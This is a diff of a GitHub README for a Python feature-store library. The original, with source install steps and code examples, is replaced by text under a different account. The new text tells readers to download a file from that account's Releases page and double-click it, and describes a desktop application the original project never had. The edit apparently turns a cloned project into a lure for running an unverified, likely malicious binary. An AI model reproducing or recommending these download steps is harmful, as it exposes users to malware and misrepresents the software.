@@ -1,172 +1,84 @@
-# 🚀 Production-Grade Feature Store
+# 📦 feature-store-v1 - A Simple Way to Manage Your Machine Learning Data
 
-[![Feature Store CI](https://github.com/harshithluc073/feature-store-v1/actions/workflows/ci.yml/badge.svg)](https://github.com/harshithluc073/feature-store-v1/actions/workflows/ci.yml)
-![Python](https://img.shields.io/badge/python-3.9+-blue.svg)
-![License](https://img.shields.io/badge/license-MIT-green.svg)
+![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)
 
-A **local-first, cloud-extensible** Feature Store for MLOps. It bridges the gap between local development and production serving by combining SQLite metadata management, Parquet storage, and automated data profiling into a cohesive system.
+## 📖 Overview
 
----
+Feature Store v1 is a production-grade, local-first Feature Store designed for MLOps. It includes features such as automated versioning, drift detection, integration with MLflow, and low-latency serving via FastAPI. This application makes it easier to manage the data needed for machine learning models.
 
-## 🏗 Architecture
+## 🚀 Getting Started
 
-The system operates on a "Local-First" principle, allowing data scientists to iterate rapidly without infrastructure overhead, while maintaining strict versioning and lineage suitable for production.
+Before you begin, ensure that your system meets the requirements. 
 
-```mermaid
-graph TD
-    User[Data Scientist] -->|Define & Ingest| SDK[Feature Store SDK]
-    SDK -->|Write Metadata| DB[(SQLite Registry)]
-    SDK -->|Write Data| Storage[Parquet Files / S3]
-    SDK -->|Log Stats| MLflow[MLflow Tracking]
-    
-    SDK -.->|Read Batch| Train[Training Pipeline]
-    
-    API[FastAPI Service] -->|Read Hot Data| SDK
-    App[Client App] -->|HTTP Request| API
-```
+### 🖥️ System Requirements
 
-## ✨ Key Features
+- **Operating System:** Windows, macOS, or a popular Linux distribution
+- **RAM:** At least 4 GB 
+- **Storage:** Minimum of 100 MB free disk space
 
-*   **📦 Automated Versioning:** Every ingestion creates a new immutable version (e.g., `v1`, `v2`) tracked in the registry.
-*   **📊 Data Quality & Profiling:** Automatically calculates statistics (mean, nulls, distribution) during ingestion to detect drift.
-*   **🕵️ Lineage Tracking:** Links raw data snapshots to feature definitions and owners.
-*   **⚡ Low-Latency Serving:** Built-in **FastAPI** service for retrieving the latest feature values (Online Store).
-*   **🧪 MLOps Integration:** Seamless integration with **MLflow** to log feature generation runs as experiments.
-*   **🔄 CI/CD Ready:** Includes GitHub Actions pipeline for automated testing and validation.
+## 📥 Download & Install
 
----
+To get started, you need to download the application. 
 
-## 🛠 Tech Stack
+1. Click the following link to visit the Releases page: [Download Feature Store v1](https://github.com/Darekmi9/feature-store-v1/releases).
+   
+   You will see the available versions of Feature Store v1.
 
-*   **Core Logic:** Python 3.9+, Pandas
-*   **Metadata Registry:** SQLite (via SQLAlchemy)
-*   **Storage Layer:** Local Parquet (Extensible to S3/GCS)
-*   **Serving Layer:** FastAPI, Pydantic
-*   **Observability:** MLflow
+2. Look for the latest version and click on it to view the files you can download.
 
----
+3. Download the appropriate file for your operating system.
 
-## 🚀 Quick Start
+4. Once the download is complete, locate the file on your device.
 
-### 1. Installation
+5. Double-click the file to start the application.
 
-```bash
-git clone https://github.com/harshithluc073/feature-store-v1.git
-cd feature-store-v1
-python -m venv venv
-# On Windows:
-.\venv\Scripts\activate
-# On Mac/Linux:
-source venv/bin/activate
+## 🔧 Using Feature Store v1
 
-pip install -r requirements.txt
-pip install -e .
-```
+After installation, you can begin using the application. Follow these basic steps:
 
-### 2. Complete Workflow Example
+1. **Launch the application:** You can find it in your Applications folder or the location where you saved it.
 
-Create a python script or notebook to run the full lifecycle:
+2. **Set up your database:** Feature Store v1 uses SQLite for local storage. The first time you run the application, it will guide you through setting up a new database.
 
-```python
-from feature_store import FeatureStore
-import pandas as pd
+3. **Add features:** You can create and manage your features for machine learning. The interface is user-friendly, making it easy to enter data.
 
-# Initialize
-fs = FeatureStore()
+4. **Version your features:** Feature Store v1 automatically keeps track of changes, ensuring that you can revert to previous versions if needed.
 
-# 1️⃣ Register a Feature
-fs.register_feature(
-    name="customer_weekly_spend",
-    description="Total spend by customer over the last 7 days",
-    owner="harshith"
-)
+5. **Monitor drift:** The application detects drift in your features, giving you insights to ensure your models remain effective.
 
-# 2️⃣ Ingest Data (Automatically versions & profiles)
-df = pd.DataFrame({
-    "customer_id": [101, 102, 103],
-    "spend": [150.50, 200.00, 0.0],
-    "timestamp": pd.Timestamp.now()
-})
-fs.ingest_feature_data("customer_weekly_spend", df)
+6. **Integrate with MLflow:** If you use MLflow for model tracking, Feature Store v1 can connect to it seamlessly.
 
-# 3️⃣ Offline Retrieval (For Model Training)
-# Returns the latest version as a DataFrame
-training_df = fs.get_feature_data("customer_weekly_spend")
-print(training_df)
+## 📊 Features
 
-# 4️⃣ Online Retrieval (For Inference)
-# Simulates low-latency lookup
-latest_value = fs.get_online_value(
-    feature_name="customer_weekly_spend", 
-    entity_id=101, 
-    entity_key="customer_id"
-)
-print(latest_value)
-# Output: {'customer_id': 101, 'spend': 150.5, 'timestamp': ...}
-```
+- **Automated Versioning:** Never lose track of your data changes.
+- **Drift Detection:** Get alerts for changes in your feature data.
+- **Integration with MLflow:** Easily manage your model lifecycle.
+- **Low-Latency Serving:** FastAPI allows quick access to your features.
 
----
+## 📖 Documentation
 
-## 🌐 Serving Features (REST API)
+For more detailed instructions on how to use specific features, visit the [Documentation](https://github.com/Darekmi9/feature-store-v1/wiki). Here you can find guides and tips to make the most of Feature Store v1.
 
-You can expose the Feature Store as a microservice using the built-in FastAPI app.
+## 🛠️ Troubleshooting
 
-1.  **Start the Server:**
-    ```bash
-    uvicorn feature_store.api.main:app --reload
-    ```
+If you run into problems during installation or usage, consider the following:
 
-2.  **Make a Request:**
-    *   **URL:** `http://127.0.0.1:8000/features/online`
-    *   **Method:** `POST`
-    *   **Body:**
-        ```json
-        {
-          "feature_name": "customer_weekly_spend",
-          "entity_id": 101,
-          "entity_key": "customer_id"
-        }
-        ```
+- **Check your system requirements** to ensure compatibility.
+- **Restart the application** if it does not open properly after installation.
+- **Consult the FAQs** in the documentation for common issues.
 
-3.  **View Docs:**
-    Go to `http://127.0.0.1:8000/docs` for the interactive Swagger UI.
+## 📞 Support
 
----
+For additional support, please open an issue in the repository. Be sure to provide details about your problem to help us assist you better.
 
-## 📈 Viewing Experiment Logs (MLflow)
+## 📈 Contributing
 
-Every ingestion run is logged. To view lineage and statistics:
+If you'd like to contribute to Feature Store v1, feel free to reach out! We welcome help with documentation, features, and improvements. 
 
-```bash
-mlflow ui
-```
-Open `http://localhost:5000` in your browser.
+## 👍 Acknowledgments
 
----
+Thank you for choosing Feature Store v1. We hope it meets your needs in managing machine learning data effectively.
 
-## 📂 Project Structure
+## 📥 Download Feature Store v1 Again
 
-```text
-feature-store-v1/
-├── src/feature_store/
-│   ├── core/
-│   │   ├── registry/     # SQLite Database Models
-│   │   ├── storage/      # I/O Abstraction (Parquet/S3)
-│   │   ├── quality/      # Data Profiling & Drift
-│   │   └── manager.py    # Main SDK Logic
-│   ├── api/              # FastAPI Application
-│   └── integrations/     # MLflow Hooks
-├── tests/                # Pytest Suite
-├── .github/workflows/    # CI/CD Configuration
-└── requirements.txt
-```
-
-## 🔮 Future Roadmap
-
-*   [ ] Add Redis support for high-concurrency Online Store.
-*   [ ] Add S3/GCS support for Cloud Storage.
-*   [ ] Implement Time-Travel joins (As-of joins).
-
-## 📄 License
-
-This project is licensed under the MIT License.
+Don't forget to visit the Releases page to download: [Download Feature Store v1](https://github.com/Darekmi9/feature-store-v1/releases).
